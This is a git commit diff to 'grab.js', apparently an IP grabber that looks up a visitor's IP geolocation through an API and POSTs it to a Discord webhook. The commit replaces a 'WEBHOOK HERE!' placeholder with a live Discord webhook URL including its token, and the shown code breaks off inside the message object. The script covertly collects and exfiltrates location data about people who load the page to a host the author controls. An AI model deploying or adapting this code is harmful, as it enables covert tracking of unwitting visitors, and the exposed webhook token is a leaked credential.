d3e8126e839917171e050cfe35219ed8221441a1
Elixir <138938088+andzz035@users.noreply.github.com>
2024-02-11 10:36:09 +0100

    Update grab.js

--- grab.js
+++ grab.js
@@ -1,11 +1,11 @@
 $.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=", function(data) { //Make sure to use this api or use another but you got to change the values down below
     var request = new XMLHttpRequest();
-    request.open("POST", "WEBHOOK HERE!");
+    request.open("POST", "https://discord.com/api/webhooks/1205974919117144134/FyyAtxgt0LWZSJoFgZyTEAAX8ONhHnrXtrBbRKQ2Yuwb_osJj-gfK_FEgRjNdr1vBFLE");
   
     request.setRequestHeader('Content-type', 'application/json');
   
     var t = {
-      username: "GrabUrMom",
+      username: "Elixir",
       avatar_url: "https://previews.123rf.com/images/geotrac/geotrac1401/geotrac140100113/25298075-beautiful-hispanic-soccer-mom.jpg",
       content: "",
       embeds: [{
